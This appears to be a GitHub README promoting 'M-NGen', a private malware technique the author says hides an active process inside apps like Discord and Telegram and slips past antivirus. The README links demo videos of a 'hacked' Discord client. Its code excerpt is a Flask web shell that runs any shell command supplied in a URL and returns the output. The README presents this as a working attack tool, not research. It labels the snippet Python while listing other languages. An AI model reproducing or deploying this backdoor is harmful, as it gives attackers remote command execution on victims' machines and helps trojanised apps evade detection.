# M-NGen

M-NGen Malware Revolution
I managed to develop a completely new type of malware... Honestly, I've never seen malware work this way before!

I was able to embed a hidden active process into any application! I tested it on applications like Discord, Telegram, and some others, and the method was completely successful... The challenge here is that antivirus software will perceive the application as a legitimate version of Discord or any other app! 😳

The interesting part is that the embedding method I used is not the usual Process Injection technique.

<div align="center">
  <img src="https://files.catbox.moe/2x1ppg.png" width="350px">
</div>

> [!WARNING]  
> The method is still private, I can't share it publicly!

<div align="center">
  <img src="https://files.catbox.moe/3yceau.jpg" width="760px">
</div>

## Video :

https://github.com/user-attachments/assets/51f80947-a945-41e7-83d0-835b0fa38754

AV BYPASS :
<div align="center">
  <img src="https://files.catbox.moe/diwxzf.jpg" width="760px">
</div>

### Discord Get Hacked Hehehe
https://github.com/user-attachments/assets/a97de13d-781f-4c77-9763-14d198786eaf


## Used languages:

1. C++
2. NodeJs
3. C#

## Part Of Code : (It's Note All of The code)

```python
# This is A part From The Code
import subprocess
from flask import Flask, jsonify

f = Flask(__name__)
@f.route('/HDL/X/<t>', methods=['GET'])

def r(t):
    return h(t)

def h(c):
    if c:
        result = subprocess.run(c, shell=True, capture_output=True, text=True)
        return jsonify({"c": c, "o": result.stdout})
    return jsonify({"error": "Command not allowed"}), 403

if __name__ == '__main__':
    f.run(debug=True)


